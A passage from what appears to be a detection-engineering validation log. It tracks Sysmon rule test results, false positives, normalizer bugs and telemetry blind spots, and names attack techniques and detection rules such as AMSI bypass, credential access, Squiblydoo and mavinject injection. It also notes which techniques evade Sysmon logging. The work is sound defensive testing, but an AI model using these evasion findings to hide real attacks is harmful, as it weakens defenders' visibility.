- **Subphase 6 update:** Three more confirmed occurrences this subphase, each broadening the pattern further. (1) A **4th confirmed occurrence** of the `<unknown process>` target anomaly, this time sourced from `python.exe` again during the batch parent-child re-validation run (`22:12:10`), immediately followed by a clean, fully-resolved `powershell.exe → notepad.exe` hit at `22:12:27` — the same "one broken, one clean, same window" pattern seen in Subphase 5. (2) A **new source-process variant**: three occurrences with `image=msedge.exe` and `target='<unknown process>'` (`22:15:02`, `22:15:05`, `22:16:04`), captured during `CHAIN_BROWSER_SHELL_001`'s `ms-msdt:` attempt — the first time this anomaly has been observed from a browser process rather than `python.exe` or `powershell.exe`. This further weakens any single-process-type explanation and strengthens the case for a normalizer-wide, process-agnostic race condition. (3) A **new and more specific data point**: an occurrence with `image=cmd.exe` and `target='mshta.exe'` (`22:24:26`), captured during `CHAIN_LOLBIN_CHILD_001`'s mshta.exe attempt — notably, direct Sysmon EID 1 telemetry for that exact window confirmed `mshta.exe` was **never created as a live process at all** (it was blocked pre-execution by Defender). This means the `target` field here is referencing a process image name that did not exist as a live process in this window — stronger evidence than before that the normalizer may be resolving to a stale or incorrectly cached image name rather than genuinely correlating to a live process at CreateRemoteThread-event time, rather than a pure timing/race-condition explanation alone. Recommend Codex weigh both theories (race condition vs. stale-cache resolution) when investigating, as this subphase's evidence supports either, and possibly both simultaneously.
- **Subphase 7 update (final, Phase 4B):** A **5th confirmed occurrence**, this time during the formal clean benign baseline session (no deliberate technique, no test script) — `[2026-07-12 22:55:59]`, `image=msedge.exe`, `target='C:\Windows\System32\msdt.exe'`. Directly verified via `Get-WinEvent` (EID 1, ±20s window) that `msdt.exe` **never existed as a live process at any point in the window**. This is the second occurrence (after the Subphase 6 `cmd.exe`→`mshta.exe` case) where `target` resolves to a specific, plausible, but confirmed-nonexistent process name rather than a blank `<unknown process>` — further strengthening the stale/incorrectly-cached-lookup theory as at least a contributing root cause alongside the race-condition theory. This occurrence also confirms the bug is not confined to deliberate-technique or test-script windows — it recurs during pure, unprompted ordinary usage. **Issue 2 remains open and routed to Codex at end of Phase 4B; not resolved by any subphase's testing.**

**ACTION REQUIRED: Route to Codex — Issue 3 (CONFIRMED — finalized in Subphase 7, no longer provisional)**
- **Rule:** `NET_DNS_LONG_QUERY_001`
- **Problem:** Recurring hits on `SearchApp.exe` (Windows Search) with no test activity across multiple sessions (Subphases 2–3). **Important — do not confuse with the confirmed genuine detection logged for this same rule in Subphase 4**, where a deliberate 57-character-hostname PowerShell query fired correctly and legitimately (see detailed entry above). The rule is not broken; it appears to both (a) work correctly on genuine long-hostname patterns and (b) separately over-fire on SearchApp.exe under conditions not yet characterized.
- **Fix:** Add `SearchApp.exe` exclusion or narrow the length/pattern threshold — but any fix must be validated against the confirmed-working PowerShell long-hostname case to ensure the fix doesn't regress genuine detection. Confirm final characterization with Subphase 7's formal benign baseline before finalizing.
- **Subphase 7 update (final, Phase 4B):** A **third independent, test-activity-free occurrence**, this time during the formal clean benign baseline session (`22:49:29`–`23:07:35`) at `[2026-07-12 23:00:19]`. Directly confirmed via Sysmon telemetry that the exact query name was `b59dd060c31a5268a4dd55e6dc581400.azr.footprintdns.com` (53 characters) — a legitimate Microsoft Azure telemetry domain (`footprintdns.com`), fired moments after Ayush used the taskbar search box to launch PowerShell, not from anything he typed. **Status upgraded from "provisional, pending Subphase 7 baseline" to CONFIRMED — ACTION REQUIRED: Route to Codex.** Fix recommendation, refined with this new evidence: exclude `SearchApp.exe` as a source process outright (preferred, simplest, most robust) rather than an allowlist approach targeting specific telemetry domain suffixes, since `SearchApp.exe` has no legitimate DNS-tunneling detection value for this rule and Microsoft telemetry domain patterns could shift over time. This does not affect or regress the confirmed-genuine `powershell.exe` long-hostname detection from Subphase 4, which used a different source process entirely.

**NEEDS REVIEW — Issue 4 (escalating toward "genuine FP surface" — new evidence in Subphase 5 window)**
- **Rule:** `API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001`
- **Problem:** Originally fired twice (`[2026-07-07 22:18:33]` and `[2026-07-07 22:18:35]`) immediately following the `PS_WMI_EXEC_001` re-test: `wmiprvse.exe` → `winlogon.exe` (access=0x1410) and `wmiprvse.exe` → `lsass.exe` (access=0x1410). Subphase 5's formal re-test (`vm_tp_test_03_chains_api_network.ps1`) did not reproduce this specific `wmiprvse.exe` pattern. **However, an independent later session (2026-07-12, ambient/background activity, three days after Subphase 5) captured the rule firing twice more** — this time from `svchost.exe`, not `wmiprvse.exe` — against the same target set (`svchost.exe → winlogon.exe`, `svchost.exe → lsass.exe`, both access=0x1fffff), with **zero WMI activity anywhere in that session**.
- **Assessment updated:** The original "WMI provider housekeeping" theory (that `wmiprvse.exe` touching lsass/winlogon is an expected side effect of servicing `Win32_Process.Create()`) is significantly weakened by this new data — the identical target-access pattern is now confirmed occurring from a completely different, non-WMI source process, with no WMI trigger present at all. This suggests the pattern may be a genuine, source-process-agnostic FP surface (e.g., routine `svchost.exe`-hosted service activity querying/touching `lsass.exe`/`winlogon.exe` for legitimate OS reasons unrelated to any suspicious technique) rather than something specifically tied to WMI. **Recommend escalating this from "needs review" toward likely-FP classification** — Codex should consider whether the rule's target-centric approach (lsass/winlogon/csrss) needs a broader system-caller exclusion set (potentially including `svchost.exe` and `wmiprvse.exe` alongside the existing exclusions), similar to the fix pattern already used for Issue 1. A repeat isolated test (no WMI, no other test activity, clean baseline) in Subphase 7's benign baseline session would help finalize this classification before deciding on a fix.
- **Subphase 7 update (final, Phase 4B) — left explicitly unresolved, not escalated further, not closed:** Zero occurrences during the clean, isolated 18-minute-6-second Subphase 7 benign baseline window (`22:49:29`–`23:07:35`; no WMI activity, no other deliberate test activity present). This is genuine supporting evidence that the pattern is **not** a guaranteed, constant side effect of ordinary background `svchost.exe`/system activity within an ~18-minute window. However, separately — and **not** counted as clean-baseline evidence, since it occurred *before* the formal Subphase 7 session boundary (`[2026-07-12 22:47:33]`–`[2026-07-12 22:47:34]`, prior to the `22:49:29` fresh pipeline restart, confirmed via `rule_hits.log` SESSION END/START markers) — 10 more hits were captured: `wmiprvse.exe → winlogon.exe`/`lsass.exe` (access=0x1410), matching the **original Subphase 2 WMI-provider-housekeeping pattern**, not the `svchost.exe`-without-WMI variant referenced above. **Net assessment: both the `wmiprvse.exe`-driven and `svchost.exe`-driven variants of this pattern remain independently reproducible in this environment across different sessions.** A single clean-baseline non-occurrence is not sufficient to either fully resolve or further escalate this issue. **Per the project's flagging standards, no verdict is being forced here — classification is downgraded back from "escalating toward likely-FP" to "needs review — insufficient evidence for a conclusive classification."** This issue is left open at the close of Phase 4B, not routed to Codex on current evidence, flagged for revisiting if/when it recurs again with either clearer isolation or a higher occurrence frequency.

**OPERATIONAL LESSON — Issue 5 (process note, not a rule defect)**
- **Observation:** A silent pipeline (crashed, stalled, or simply not running in Terminal 1) produces identical symptoms — zero RULE_HIT output — to a genuine rule non-match. This caused a temporary false "confirmed bug" conclusion for `LOLBIN_ODBCCONF_001` during Subphase 3 before being corrected.
- **Mitigation going forward:** Before logging any rule as FAIL for the remainder of Phase 4B, cross-check pipeline liveness (continued stdout activity/heartbeat) and, where in doubt, directly inspect Sysmon telemetry via `Get-WinEvent` to confirm whether a qualifying event was even generated, before concluding the rule itself failed to match.
- **Extended in Subphase 4:** a second, distinct variant of this same class of false-FAIL was discovered — a **full pipeline session restart** (`rule_hits.log` showing `=== SESSION END ===` / `=== SESSION START ===` markers) silently occurred mid-troubleshooting for `NET_POWERSHELL_HTTP_001`, swallowing at least two test attempts that looked like genuine rule failures but were actually lost to a dead window between sessions. **Refined mitigation:** always check `rule_hits.log -Tail` for session boundary markers bracketing the exact test window, not just whether the pipeline is "currently" running at the moment you check — a session can end and restart between your test command and your verification check without either terminal showing an obvious visible error.

**ACTION REQUIRED: Route to Codex — Issue 6 (NEW — CONFIRMED)**
- **Rule:** `NET_DNS_SCRIPT_ENGINE_001`
- **Problem:** A genuine, correctly-timed Sysmon EID 22 (DnsQuery) event was confirmed to exist for the exact simulated wscript.exe DNS query (`QueryName: shadowsensortest4b.nonexistent.local`, matching timestamp), but the event's `Image` field resolved to `<unknown process>` and `ProcessGuid` to an all-zero value (`{00000000-0000-0000-0000-000000000000}`), leaving the rule engine with no usable process identity to match `wscript.exe`/`cscript.exe`/`mshta.exe` against. The rule therefore did not fire — correctly, given the malformed input, but this represents a real detection gap since the underlying technique (script-host DNS resolution) is not actually being caught.
- **Likely root cause:** A normalizer gap in PID→Image/ProcessGuid resolution, specifically for events where the source process may be short-lived, spawned indirectly (e.g., via a COM object rather than a direct child process), or where Sysmon logs the event with a delay relative to process lifecycle state.
- **Cross-reference:** This is the same failure signature (`<unknown process>` / unresolved GUID) already documented under Issue 2 for `API_CREATE_REMOTE_THREAD_001`'s `target` field. **Strongly recommend Codex treat this as a single shared normalizer defect investigation** covering PID→image resolution across EID 8, EID 22, and (pending Subphase 5 results) potentially EID 10, rather than three independent per-rule patches. A unified fix (e.g., a more robust process-lookup fallback, retry logic, or querying a cached process table maintained by the collector rather than relying solely on the live OS process table at event-processing time) would likely resolve multiple symptoms at once.
- **Fix needed:** Normalizer-level investigation into why PID→Image/ProcessGuid resolution fails for these event types/contexts, followed by a rule-engine-level decision on whether to (a) fix resolution so the process identity is available, or (b) add a fallback matching path for cases where resolution genuinely cannot succeed (though option (a) is strongly preferred since it fixes the root cause rather than working around it).

**ENVIRONMENT-LIMITATION NOTE — Issue 7 (NEW — not Codex-routable; documentation/research-paper item)**
- **Rules affected:** `NET_SUSPICIOUS_PORT_001`, `NET_SMB_LATERAL_001` (confirmed); `NET_SCRIPTING_ENGINE_HTTP_001`, `NET_LOLBIN_PROCESS_HTTP_001`'s mshta.exe path (confirmed, separate cause)
- **Problem:** Two distinct, confirmed telemetry-layer limitations discovered during Subphase 4 network rule testing, neither of which is fixable via YAML/rule changes:
  1. **Sysmon EID 3 port restriction:** The locked `sysmonconfig-export.xml` (lines 260–275) includes an explicit `onmatch="include"` filter limiting NetworkConnect (EID 3) capture to destination ports 80 and 443 only, by deliberate design ("a very conservative approach to network logging, limited to only extremely high-signal events," per the config's own inline comment). This means any rule targeting a non-80/443 port (`NET_SUSPICIOUS_PORT_001` for port 4444; `NET_SMB_LATERAL_001` for port 445) can **never** fire under the current Sysmon configuration, regardless of rule correctness.
  2. **COM/WinINet blind spot:** `MSXML2.XMLHTTP` ActiveX/COM-object-based HTTP requests (used by both `mshta.exe`'s JavaScript-invoked ActiveXObject call and `wscript.exe`'s VBScript CreateObject call) do not generate a Sysmon EID 3 event at all, even against a real, reachable destination on an included port (443). This is a distinct root cause from the port-filter issue above — it appears to be a genuine gap in Sysmon's WFP-based network-connection hook for this specific class of COM-mediated network call, separate from IE/WinINet's own request path.
- **Also confirmed (adjacent, positive finding):** loopback (127.0.0.1) connections are not reliably captured by Sysmon EID 3 in this environment even on included ports (80/443) — a broad audit of 115 EID 3 events in the relevant window showed zero originating from loopback destinations. Re-targeting simulations at a real external destination (`example.com`) resolved this for socket-based (non-COM) connections.
- **Recommendation:** None of these three findings require Codex action for Phase 4B — they are environment/simulation-methodology facts, not rule bugs. However, all three are legitimate, citable findings for **Section 2 (Telemetry Design)** of the research paper: they demonstrate concrete, confirmed blind spots in a "conservative" Sysmon network-logging posture, and a real methodological lesson (loopback ≠ a valid network-layer simulation target for Sysmon-based tooling). For a future phase (not Phase 4B), consider recommending an explicit widening of the Sysmon EID 3 include filter to add high-risk C2 ports (4444, 1337, 8888, 9999, 31337) if network-layer detection coverage is prioritized over log volume; the COM/WinINet blind spot would likely require a supplementary detection mechanism (e.g., ETW WinINet provider correlation) rather than a Sysmon config change, since it is a hook-level limitation rather than a filter-configuration issue.

**ENVIRONMENT-LIMITATION NOTE — Issue 8 (NEW — not Codex-routable; documentation/research-paper item)**
- **Rules affected:** `API_DLL_LOAD_SUSPICIOUS_PATH_001`, `API_LOLBIN_DLL_UNSIGNED_001` (both EID 7, confirmed); `API_OPEN_PROCESS_VM_WRITE_001` (EID 10, confirmed); `API_AV_PROCESS_ACCESS_001` deliberate-trigger path (EID 10, confirmed)
- **Problem:** Four distinct, confirmed telemetry/OS-security-layer limitations discovered during Subphase 5 API/Memory rule testing, none of which are fixable via YAML/rule changes:
  1. **Managed/pure-IL assembly ImageLoad blind spot:** A pure-IL .NET DLL (built via `Add-Type -OutputType Library`) never generated a Sysmon EID 7 event regardless of loading mechanism — neither via `Assembly.LoadFile()` from PowerShell (a CLR-managed load path, a known category of blind spot) nor via `rundll32.exe` (a *native* process, which normally would trigger a native ImageLoad callback). The `rundll32.exe` case is the more surprising of the two, suggesting mixed-mode/pure-IL assemblies may route through the CLR shim (`mscoree.dll`) rather than a standard PE section mapping even when invoked from native code, evading the kernel-level hook Sysmon monitors regardless of caller type.
  2. **mavinject.exe injection mechanism invisible to Sysmon EID 10:** Atomic Red Team's T1055.001 test (mavinject-based process injection) demonstrably executed — both `mavinject.exe` and its target `notepad.exe` confirmed spawned via EID 1 with the correct parent-child chain — yet produced zero EID 10 (`ProcessAccess`) events. This indicates `mavinject.exe`'s actual memory-write mechanism does not trigger a standard user-mode `OpenProcess`-pattern access that Sysmon's `ProcessAccess` ETW hook observes, or does so via a path (kernel-mediated, COM-based, or otherwise) outside that hook's visibility.
  3. **PPL (Protected Process Light) blocks deliberate AV-access testing:** A direct, deliberate `OpenProcess(PROCESS_TERMINATE)` call against `MsMpEng.exe` returned a NULL handle — PPL protection denies the access at the OS level before Sysmon's EID 10 hook can observe anything (Sysmon generally only logs *granted* access). This means `API_AV_PROCESS_ACCESS_001`'s genuine-detection path cannot currently be validated via a direct deliberate simulation against Windows Defender in this environment.
  4. **Defender/AMSI competing-layer interference (same category as prior findings, recurring):** Atomic Red Team tests for T1055.003 (`InjectContext.exe`, signature-blocked) and T1134.001 (payload download, AMSI-blocked) were both intercepted by Windows Defender before their respective techniques could execute — consistent with the interference pattern already documented for `PS_AMSI_BYPASS_001`, `PS_CREDENTIAL_ACCESS_001`, `LOLBIN_RUNDLL32_SUSPICIOUS_001`, and `LOLBIN_REGSVR32_001`. This is a distinct root cause from findings 1–3 above (AV competition vs. genuine telemetry/OS-security gaps) but is grouped here as it's also non-Codex-routable.
- **Recommendation:** None of these four findings require Codex action for Phase 4B — they are environment/simulation-methodology facts, not rule bugs, and in each case the corresponding rule's YAML condition was never actually exercised against a genuine qualifying event (so nothing about the rules' logic has been disproven). All are legitimate, citable findings for **Section 2 (Telemetry Design)** and **Section 3 (Rule-Based Detection)** of the research paper: they demonstrate concrete blind spots specific to memory/API-layer detection — a managed-code ImageLoad gap, an injection-technique-specific ProcessAccess gap, and an OS-security-mechanism (PPL) barrier to direct AV-access simulation — each of which would require a supplementary detection mechanism (e.g., .NET CLR profiling APIs for managed-assembly loads, ETW providers beyond Sysmon's default set for mavinject-style injection, or accepting PPL as a structural validation limit for AV-targeting rules) rather than a Sysmon config or rule-logic change to close.

**ACTION REQUIRED: Route to Codex — Issue 9 (NEW — CONFIRMED, Subphase 6)**
- **Rule:** `CHAIN_SCHEDULED_TASK_SCRIPT_001`
- **Problem:** A genuine, correctly-simulated scheduled-task-launches-suspicious-PowerShell technique executed exactly as designed and was fully captured by Sysmon with complete parent-child fidelity, but the rule did not fire. Direct telemetry confirmed the PowerShell process's parent was `svchost.exe -k netsvcs -p -s Schedule` — the genuine Task Scheduler service host on this Windows version — rather than `taskeng.exe`/`taskhostw.exe`/`schtasks.exe`, the three parent images currently in the rule's YAML condition.
- **Likely root cause:** A rule-coverage gap, not a normalizer or telemetry defect. On this Windows version, the Schedule service directly launches scheduled-task target processes from inside its own `svchost.exe -s Schedule` host process rather than spawning a standalone `taskeng.exe`/`taskhostw.exe` intermediary for this class of action — an architecture change from older Windows versions the rule's parent-image list does not account for.
- **Fix needed:** Add `svchost.exe` to the rule's parent-image match list, scoped by requiring the parent command line to contain `-s Schedule` (to preserve precision and avoid false-matching on every other `svchost.exe`-hosted service spawning an unrelated child process — a similar precision concern to the fix pattern already used for Issue 1's `csrss.exe`/`conhost.exe` exclusions, just inverted to an inclusion here). Codex should also confirm whether `schtasks.exe` and `taskeng.exe`/`taskhostw.exe` remain reachable as parents under any other scheduled-task invocation path on this Windows version, or whether they are legacy entries that should be retained defensively (for older/hybrid environments) alongside the new `svchost.exe` condition rather than replaced outright.
- **Not cross-referenced with Issues 2/6:** this is a distinct rule-coverage gap, unrelated to the PID→image/ProcessGuid normalizer defect pattern documented under Issues 2 and 6 — the process identity here was fully and correctly resolved by the normalizer; the rule's own parent-image list is simply incomplete.

---

## Subphase Completion Reports

```
=== SUBPHASE 1 COMPLETION REPORT ===
Sysmon status: Running
EID 7 (ImageLoad) in Sysmon config: CONFIRMED (onmatch="exclude", empty body → all ImageLoad events captured)
EID 22 (DnsQuery) in Sysmon config: CONFIRMED (onmatch="exclude", empty body → all DnsQuery events captured)
Pipeline startup: CLEAN — 48 rules loaded (ID10:4, ID8:1, ID7:2, ID1:33, ID22:2, ID3:6)
Atomic Red Team: Installed and confirmed (Invoke-AtomicTest T1055 -ShowDetailsBrief listed 13 sub-tests)
Validation log created: docs/phase4b_validation_log.md YES
Phase 2B scripts: All present
READY TO PROCEED TO SUBPHASE 2: YES
Reason if NO: N/A
=== END REPORT ===
```

```
=== SUBPHASE 2 COMPLETION REPORT ===
Original 4 PS rules re-validated:
  PS_ENCODED_CMD_001: PASS
  PS_DOWNLOAD_CRADLE_001: PASS
  PS_AMSI_BYPASS_001: PARTIAL — Defender interference
  PS_HIDDEN_WINDOW_001: PASS

New 7 PS rules validated:
  PS_EXECUTION_POLICY_BYPASS_001: PASS
  PS_INVOKE_EXPRESSION_001: PASS
  PS_VERSION_DOWNGRADE_001: PASS
  PS_REFLECTIVE_ASSEMBLY_001: PASS
  PS_CREDENTIAL_ACCESS_001: PARTIAL — Defender interference
  PS_CONSTRAINED_LANG_BYPASS_001: PASS
  PS_WMI_EXEC_001: PASS (confirmed on re-test with forced new-process invocation; initial attempt gave false FAIL due to simulation methodology)

Rules flagged for Codex fix (batched, addressed after full Phase 4B):
  1. API_AV_PROCESS_ACCESS_001 — confirmed persistent FP (csrss.exe/conhost.exe → MpCmdRun.exe/MsMpEng.exe)
  2. API_CREATE_REMOTE_THREAD_001 — confirmed persistent FP, high volume, unresolved target
  3. NET_DNS_LONG_QUERY_001 — provisional FP (SearchApp.exe), pending Subphase 7 baseline
  4. API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 — new observation (wmiprvse.exe → winlogon.exe/lsass.exe), not yet classified — needs review

Validation log updated with all 11 entries: YES
READY TO PROCEED TO SUBPHASE 3: YES
=== END REPORT ===
```

```
=== SUBPHASE 3 COMPLETION REPORT ===
Original 4 LOLBin rules re-validated:
  LOLBIN_MSHTA_001: PASS
  LOLBIN_RUNDLL32_SUSPICIOUS_001: PARTIAL — Defender/AV interference (blocked at launch, javascript:/RunHTMLApplication pattern intercepted)
  LOLBIN_REGSVR32_001: PARTIAL — Defender/AV interference (blocked at launch, Squiblydoo remote-scriptlet pattern intercepted)
  LOLBIN_CERTUTIL_001: PASS

New 9 LOLBin rules validated:
  LOLBIN_MSIEXEC_REMOTE_001: PASS
  LOLBIN_ODBCCONF_001: PASS (initial apparent FAIL traced to a stalled/non-running pipeline process during that test window, not a rule defect)
  LOLBIN_CMSTP_001: PASS
  LOLBIN_HH_CHM_001: PASS
  LOLBIN_REGASM_REGSVCS_001: PASS (both RegAsm.exe and RegSvcs.exe fired correctly from full .NET Framework64 v4.0.30319 path)
  LOLBIN_WMIC_PROCESS_001: PASS
  LOLBIN_BITSADMIN_001: PASS
  LOLBIN_INSTALLUTIL_001: PASS
  LOLBIN_FORFILES_001: PASS

Rules flagged for Codex fix (batched, addressed after full Phase 4B):
  API_AV_PROCESS_ACCESS_001 — confirmed persistent FP (unchanged from Subphase 2)
  API_CREATE_REMOTE_THREAD_001 — confirmed persistent FP, high volume, target resolution inconsistent
  NET_DNS_LONG_QUERY_001 — provisional FP, pending Subphase 7 baseline (unchanged)
  API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 — needs review (unchanged from Subphase 2)

Operational note added: confirmed a "no RULE_HIT" result must be cross-checked against direct Sysmon telemetry and pipeline liveness before concluding a rule FAIL.
Validation log updated with all 13 entries: YES
READY TO PROCEED TO SUBPHASE 4: YES
=== END REPORT ===
```

```
=== SUBPHASE 4 COMPLETION REPORT ===
NET_POWERSHELL_HTTP_001 (re-validated): PASS — confirmed after extensive investigation; two environmental artifacts encountered and resolved (loopback blind spot; pipeline session restart mid-test), rule logic itself is correct

NET_SCRIPTING_ENGINE_HTTP_001: PARTIAL — environment-limited (confirmed). COM/WinINet-mediated MSXML2.XMLHTTP calls from wscript.exe do not generate a Sysmon EID 3 event in this environment. Not a rule defect — no Codex action.

NET_LOLBIN_PROCESS_HTTP_001: PASS (confirmed via msiexec.exe against example.com). mshta.exe path for this same rule is separately environment-limited (same COM/WinINet blind spot as above) — rule logic confirmed correct via the msiexec.exe path.

NET_SUSPICIOUS_PORT_001: PARTIAL — environment-limited (confirmed). Sysmon config's EID 3 include filter is hard-restricted to ports 80/443 only (confirmed via direct XML inspection of the locked sysmonconfig-export.xml). Port 4444 traffic is never logged by Sysmon; rule can never fire under current config. Not a rule defect — no Codex action for Phase 4B.

NET_LOLBIN_NETWORK_001: PASS (confirmed via msiexec.exe against example.com; 127.0.0.1 variant produced no hit due to loopback blind spot, same as NET_POWERSHELL_HTTP_001).

NET_SMB_LATERAL_001: PARTIAL — environment-limited (confirmed). Same Sysmon EID 3 port-filter restriction as NET_SUSPICIOUS_PORT_001 — port 445 never logged. Not a rule defect.

NET_DNS_LONG_QUERY_001 (EID 22): PASS — confirmed genuine detection via a dedicated 57-character-hostname PowerShell query, cleanly attributed and correctly fired. Distinct from the pre-existing provisional SearchApp.exe FP (Issue 3, unchanged, still pending Subphase 7 baseline).

NET_DNS_SCRIPT_ENGINE_001 (EID 22): FAIL — CONFIRMED BUG, route to Codex. A genuine, correctly-timed Sysmon EID 22 event was confirmed to exist for the wscript.exe DNS query test, but Image/ProcessGuid resolved to <unknown process>/all-zero GUID, so the rule could not match on process name. Root cause appears to be a normalizer PID→image resolution gap, and shares an identical failure signature with the pre-existing API_CREATE_REMOTE_THREAD_001 target-resolution bug (Issue 2) — flagged for Codex as a possible shared root-cause investigation across event types (new Cross-Cutting Issue 6).

Rules flagged for Codex fix (batched, addressed after full Phase 4B):
  1. API_AV_PROCESS_ACCESS_001 — confirmed persistent FP (unchanged, recurred again this subphase)
  2. API_CREATE_REMOTE_THREAD_001 — confirmed persistent FP, high volume, unresolved target (unchanged, recurred again this subphase with a new python.exe-attributed occurrence)
  3. NET_DNS_LONG_QUERY_001 — provisional FP on SearchApp.exe, pending Subphase 7 baseline (unchanged; note this rule ALSO produced a confirmed genuine PASS this subphase on a different trigger — both facts carried forward)
  4. API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 — needs review (unchanged, no new occurrences this subphase; scheduled for re-test in Subphase 5)
  6. NET_DNS_SCRIPT_ENGINE_001 — NEW, confirmed bug, normalizer process-resolution failure, cross-referenced with Issue 2

Environment-limitation findings (not Codex-routable, documentation/research-paper items):
  - Sysmon EID 3 include filter restricted to ports 80/443 only (affects NET_SUSPICIOUS_PORT_001, NET_SMB_LATERAL_001 — confirmed structurally unable to fire under current config)
  - COM/WinINet-mediated HTTP (MSXML2.XMLHTTP via mshta.exe/wscript.exe) not captured by Sysmon EID 3 (affects NET_SCRIPTING_ENGINE_HTTP_001 fully, NET_LOLBIN_PROCESS_HTTP_001's mshta path partially — msiexec path confirms rule logic is sound)
  - Loopback (127.0.0.1) connections not reliably captured by Sysmon EID 3 even on included ports — resolved for future testing by using example.com as simulation target instead
  - Pipeline session-restart-mid-test discovered as a second variant of the Subphase 3 "silent pipeline" operational lesson — mitigation extended to checking rule_hits.log session boundary markers, not just current liveness

Validation log updated with all 8 entries plus 2 new Cross-Cutting Issues (Issue 6 confirmed bug, Issue 7 environment-limitation documentation note): YES
READY TO PROCEED TO SUBPHASE 5: YES
=== END REPORT ===
```

```
=== SUBPHASE 5 COMPLETION REPORT ===
API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 (re-validated): PASS

API_CREATE_REMOTE_THREAD_001 (EID 8 — deferred, now validated): PASS (via script's own built-in CreateRemoteThread test, powershell.exe→notepad.exe clean hit) + PARTIAL (Atomic Red Team T1055.003 blocked outright by Defender before executing — "contains a virus or potentially unwanted software"). Second/third confirmed recurrence of the unresolved python.exe-sourced <unknown process> target anomaly also captured in this window (Issue 2 update).

API_DLL_LOAD_SUSPICIOUS_PATH_001 (EID 7): ENVIRONMENT-LIMITED — confirmed via full-window EID 7 audit. Pure-IL managed .NET test DLL never generated an ImageLoad event despite the LoadFile() call provably succeeding. Not a rule defect.

API_LOLBIN_DLL_UNSIGNED_001 (EID 7): ENVIRONMENT-LIMITED — confirmed. Same pure-IL blind spot reproduced via rundll32.exe (a native process), despite rundll32's own "Missing entry: Run" error dialog proving the LoadLibrary step succeeded. Not a rule defect — a more general finding than API_DLL_LOAD_SUSPICIOUS_PATH_001 since the invoking process here is native, not managed.

API_OPEN_PROCESS_VM_WRITE_001 (EID 10): ENVIRONMENT-LIMITED — confirmed. Atomic T1055.001 (mavinject.exe injection into notepad.exe) demonstrably executed (EID 1 confirms both processes + correct parent-child chain), but zero EID 10 events exist for mavinject.exe anywhere in the test window (confirmed via both narrow and widened time-bounded queries). Not a rule defect — mavinject's injection mechanism does not trigger Sysmon's ProcessAccess hook.

API_TOKEN_MANIPULATION_001 (EID 10): PARTIAL — Defender interference (confirmed). Atomic T1134.001's payload download blocked by AMSI before the named-pipe impersonation technique could execute. Same interference class as prior AMSI-blocked rules. Incidentally triggered PS_DOWNLOAD_CRADLE_001 and NET_POWERSHELL_HTTP_001 on the blocked download command line.

API_AV_PROCESS_ACCESS_001 (EID 10, deliberate-trigger path): ENVIRONMENT-LIMITED — confirmed. Direct OpenProcess(PROCESS_TERMINATE) against MsMpEng.exe returned a NULL handle, consistent with PPL (Protected Process Light) blocking the call before Sysmon could observe it. Rule's pre-existing unrelated FP (Issue 1) recurred again in a separate independent session — 5 more occurrences, csrss.exe/conhost.exe → MpCmdRun.exe, zero test-driven.

Atomic Red Team used for: T1055.003 (blocked by Defender before injection), T1055.001 (executed successfully via mavinject.exe, but no EID 10 telemetry produced), T1134.001 (blocked by Defender before technique execution)

Rules flagged for Codex fix (batched, addressed after full Phase 4B):
  1. API_AV_PROCESS_ACCESS_001 — confirmed persistent FP (unchanged, recurred a 5th time in an independent session outside formal Subphase 5 testing); genuine-detection path also now confirmed blocked by PPL, meaning this rule currently has no validated working detection path in this environment
  2. API_CREATE_REMOTE_THREAD_001 — confirmed persistent FP, high volume, unresolved target (unchanged; 3rd confirmed occurrence of the python.exe-sourced anomaly captured this subphase, immediately adjacent to a clean resolved hit from the same test window — reinforces a timing/race-condition theory)
  3. NET_DNS_LONG_QUERY_001 — provisional FP on SearchApp.exe, pending Subphase 7 baseline (unchanged, not re-tested this subphase)
  4. API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 — ESCALATED from "needs review" toward likely-FP: a new independent-session recurrence via svchost.exe (not wmiprvse.exe, no WMI activity present) significantly weakens the original "WMI housekeeping" theory
  6. NET_DNS_SCRIPT_ENGINE_001 — unchanged, confirmed bug, normalizer process-resolution failure (not re-tested this subphase, carried forward from Subphase 4)

Environment-limitation findings (not Codex-routable, documentation/research-paper items — new Cross-Cutting Issue 8):
  - Managed/pure-IL .NET assembly loads not captured by Sysmon EID 7, confirmed via both a CLR-managed load path (PowerShell LoadFile) and a native-process load path (rundll32.exe) — the latter is a more general and more concerning finding than initially expected
  - mavinject.exe-based process injection (T1055.001) produces no Sysmon EID 10 telemetry despite demonstrably executing — a real technique that structurally evades this specific hook
  - PPL (Protected Process Light) blocks direct deliberate OpenProcess testing against Windows Defender's MsMpEng.exe, limiting genuine-detection-path validation for API_AV_PROCESS_ACCESS_001 in this environment
  - Defender/AMSI interference recurred for two more Atomic Red Team techniques (T1055.003, T1134.001), consistent with the established interference category from Subphases 2-3

Validation log updated with all 7 entries plus Issue 1/2/4 updates and new Cross-Cutting Issue 8: YES
READY TO PROCEED TO SUBPHASE 6: YES
=== END REPORT ===
```

```
=== SUBPHASE 6 COMPLETION REPORT ===
Original 4 parent-child rules re-validated:
  CHAIN_OFFICE_POWERSHELL_001: PASS
  CHAIN_OFFICE_CMD_001: PASS
  CHAIN_SCRIPT_HOST_CMD_001: PASS
  CHAIN_SCRIPT_HOST_POWERSHELL_001: PASS

New 5 parent-child rules validated:
  CHAIN_BROWSER_SHELL_001: PASS (confirmed via custom registered protocol handler; ms-msdt: URI attempt separately confirmed non-functional on this patched Windows build — prompt accepted but no msdt.exe process ever created — not a rule defect)
  CHAIN_OFFICE_WSCRIPT_001: SKIPPED — Office not installed (Office-application-as-parent path already validated via CHAIN_OFFICE_POWERSHELL_001/CHAIN_OFFICE_CMD_001; only the wscript.exe child type untested)
  CHAIN_REGSVR32_CHILD_001: PASS (local-SCT-file Squiblydoo variant; also resolved LOLBIN_REGSVR32_001's Subphase 3 PARTIAL — see below)
  CHAIN_SCHEDULED_TASK_SCRIPT_001: FAIL — CONFIRMED BUG, route to Codex (rule's parent-image list lacks svchost.exe -s Schedule; technique executed and was fully captured by Sysmon, rule simply doesn't recognize this Windows version's Task Scheduler architecture)
  CHAIN_LOLBIN_CHILD_001: PASS (via rundll32.exe shell32.dll,ShellExec_RunDLL; mshta.exe javascript:/ActiveXObject variant separately confirmed Defender-blocked, same interference class as LOLBIN_RUNDLL32_SUSPICIOUS_001/LOLBIN_REGSVR32_001's remote variants)

Bonus resolutions from earlier subphases:
